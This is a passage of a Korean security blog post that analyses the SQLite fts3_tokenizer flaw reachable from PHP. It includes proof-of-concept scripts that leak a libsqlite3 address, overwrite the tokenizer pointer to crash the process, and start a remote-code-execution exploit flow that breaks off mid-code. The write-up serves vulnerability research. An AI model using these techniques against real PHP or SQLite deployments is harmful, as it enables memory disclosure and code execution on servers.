variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>취약한 부분의 쿼리를 PHP 코드로 작성하여 쿼리를 수행하여 메모리 릭을 진행합시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 502px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVQI123KzQ6CMBhE0Q80xo2KSilQSgui/AiuXPj+L3aNNe5cTCaTOZKcHFU9Yd0dY0dqP3NWDbq44pqFLO/ITY/SXdhp1gZr/Rxsqi8Upqe0IxLtkbIamJZXOH37CH0bnmy2CpEd0SpB4sMXf/pPfiZeH3kDitwye+jIRWAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png\"\n        srcset=\"/static/ece3868599479ae40e51537c45dfb6e1/e9ff0/6.png 180w,\n/static/ece3868599479ae40e51537c45dfb6e1/f21e7/6.png 360w,\n/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png 502w\"\n        sizes=\"(max-width: 502px) 100vw, 502px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>그렇다면, 해당 부분은 왜 메모리 릭이 가능하지 살펴봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">/* Load the built-in tokenizers into the hash table */</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">==</span><span class=\"token constant\">SQLITE_OK</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pSimple<span class=\"token punctuation\">)</span>\n     <span class=\"token operator\">||</span> <span class=\"token class-name\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"porter\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pPorter<span class=\"token punctuation\">)</span> \n     <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>pIcu <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"icu\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pIcu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      rc <span class=\"token operator\">=</span> <span class=\"token constant\">SQLITE_NOMEM</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> sqlite3_tokenizer_module simpleTokenizerModule <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n simpleCreate<span class=\"token punctuation\">,</span>\n simpleDestroy<span class=\"token punctuation\">,</span>\n simpleOpen<span class=\"token punctuation\">,</span>\n simpleClose<span class=\"token punctuation\">,</span>\n simpleNext<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">built-in tokenizer</code> 는 hash-table에 로드되며 해당 주소는 libsqlite3 의 .bss 섹션을 참조되고 있습니다.</li>\n</ul>\n<h3 id=\"sqlite-fts3_tokenizer-fts3_tokenizer\" style=\"position:relative;\"><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\" aria-label=\"sqlite fts3_tokenizer fts3_tokenizer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3_tokenizer(), fts3_tokenizer()</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;</span>sqlite3_tokenizer_module ptr<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>하나의 인수, 두 개의 인수로 fts3_tokenizer 함수를 호출할 수 있습니다. 첫 번째 인자는 해당 함수에서 <code class=\"language-text\">tokenizer</code>를 식별하는 문자열이며 <code class=\"language-text\">slqite3_tokenizer_module</code> 구조체에 대한 포인터입니다.</li>\n<li>즉, 하나의 인수가 전달되면 현재 등록된 tokenizer 구현에 대한 포인터가 반환되고 두 번째 인수는 tokenizer를 등록할 사본이 반환되어 집니다.</li>\n</ul>\n<h2 id=\"fts3-callback을-통한-임의의-코드-실행-취약점\" style=\"position:relative;\"><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"fts3 callback을 통한 임의의 코드 실행 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 callback을 통한 임의의 코드 실행 취약점</h2>\n<ul>\n<li>앞서 취약한 부분의 쿼리인 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 인자에 임의의 값을 입력한 경우 크래쉬가 발생한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1212</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select fts3_tokenizer('simple', x'4141414141414141');\n        create virtual table a using fts3(tokenizer=simple);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n</code></pre></div>\n<ul>\n<li>크래쉬가 발생한 부분을 분석해보면 <code class=\"language-text\">rbp</code> 레지스터 값이 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 파라미터인 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACH0lEQVQ4y5WTe3OaUBDFb9SoURAEAXnJQyHg+xk1PpMYTaYzneb7f5jTudsmjTNJ0/6xc2GA356ze2Cu18FossNydYTf7OMiK0NWGqjpISw3hVR16fqqbNCzTK7612KiZGO+PODu8B3D8RaXhRpsN4UX9KhJ0BqgIjvIXir/BiyLJkaTLW7XJ6SdG/rQMGPo9RZ6gxXC1hAlwQS7qNAHX0GZKDkEO5xeMJntSWHQHJDKTm9Jlr9SdQbk3QejNea3j4iTKQEtJ4FmtCBULDAm/h/wTeHxBcPxhoB+2CdgWeTAMtmlykhnxe2/1huQqxiMNlisjkg7c+TyKkwnIXVOo01gpRZA1QJqkC9qKJZ0Oj9UyDfIt/nw+IOW8GqZw9bbZ4yne1JuOSkBOZg34dH61PJ4usNq84Tu4JaAdSsmIM+naV+j4XdpUbRtPgIm0gg+tMxzOJvfY7v/RlvlQNNOCMoVzuYPaHcXuFkcaLZ8FLw+XQqPBQfu7n4B+Qw9vwvHTckq/5OEik3x4c0F0UKxZPzJJQe9V3glmBjP9lhunhC3Z8jmVWj1CLoZoTdao91bwrBiMCYgV6hBUhqo1gLIqgdGoPOgs8iOsZ7ucNo9Y5hMUMkrCK0IgRXRfeQmMKsu1LIBTTRRlx0qU3ZQyau/oe+Am/YUfb+DSPMRKg0YBZVOv+rAk2yEagO+7CDSAzRrHr3X0nxc6wGskgaWOQf+BFo6ZHwLayVXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"php_in.png\"\n        title=\"php_in.png\"\n        src=\"/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png\"\n        srcset=\"/static/895cf1cf65041b4a6f0abd6f963b6726/e9ff0/php_in.png 180w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/f21e7/php_in.png 360w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png 720w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/1cfc2/php_in.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>SQLite3가 <code class=\"language-text\">xCreate</code> callback function pointer를 호출하였고 이에 대한 Callback 호출에 대한 임계값 검증이 존재하지 않았기 때문에 발생하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_tokenizer.c</span>\nm <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_module <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">sqlite3Fts3HashFind</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>m <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer: %s\"</span><span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    rc <span class=\"token operator\">=</span> SQLITE_ERROR<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span>\n    rc <span class=\"token operator\">=</span> m<span class=\"token operator\">-></span><span class=\"token function\">xCreate</span><span class=\"token punctuation\">(</span>iArg<span class=\"token punctuation\">,</span> aArg<span class=\"token punctuation\">,</span> ppTok<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token operator\">||</span> <span class=\"token operator\">*</span>ppTok <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n      <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ppTok<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>pModule <span class=\"token operator\">=</span> m<span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">sqlite3_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>aArg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"xopen-취약점\" style=\"position:relative;\"><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xopen 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>xOpen 취약점</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> exploit <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span>x<span class=\"token string\">\"9090909090909090\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>현 쿼리의 “exploit” 테이블은 앞에서 create 쿼리문으로 생성이 된후 insert 쿼리문을 이용해서 데이터를 삽입할 경우 <code class=\"language-text\">xOpen</code> Callback function pointer가 수행됩니다.</li>\n<li><code class=\"language-text\">xOpen</code> 은 값 으로 0x9090909090909090 16진수를 <code class=\"language-text\">pInput1</code> 매개 변수로 사용하여 CallBack 과 같이 트리거 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_expr.c</span>\nsqlite3_tokenizer_module <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>pModule <span class=\"token operator\">=</span> pTokenizer<span class=\"token operator\">-></span>pModule<span class=\"token punctuation\">;</span>\nsqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCsr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> rc<span class=\"token punctuation\">;</span>\nrc <span class=\"token operator\">=</span> pModule<span class=\"token operator\">-></span><span class=\"token function\">xOpen</span><span class=\"token punctuation\">(</span>pTokenizer<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pCsr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>이를 이용해서 예측이 가능한 메모리 위치에 대상 주소를 만들고 메모리 주소에 있어 <code class=\"language-text\">fts3_tokenizer</code> 의 Callback 을 트리거하여 다음 프로그램 카운터를 조작해 원하는 파라미터 값을 컨트롤해 공격 연계가 가능합니다.</li>\n</ul>\n<h1 id=\"fts3-php-rce-exploitation\" style=\"position:relative;\"><a href=\"#fts3-php-rce-exploitation\" aria-label=\"fts3 php rce exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 PHP RCE Exploitation</h1>\n<h2 id=\"exploit-공격-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 공격 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 공격 흐름도</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">$sqlite3_lib_leaked_tokenizer <span class=\"token operator\">=</span> sqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select hex(fts3_tokenizer('simple')) addr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$libsqlite3_addr <span class=\"token operator\">=</span> flip<span class=\"token punctuation\">(</span>$sqlite3_lib_leaked_tokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$libsqlite3_base <span class=\"token operator\">=</span> $libsqlite3_addr <span class=\"token operator\">-</span> $leaked_simple_tokenizer_offset<span class=\"token punctuation\">;</span>\n\n$payload <span class=\"token operator\">=</span> <span class=\"token number\">0x9090909090909090</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// payload </span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select fts3_tokenizer('simple', ?);\"</span><span class=\"token punctuation\">,</span> $payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"create table a using fts3\"</span><span class=\"token punctuation\">)</span><span class=\"token 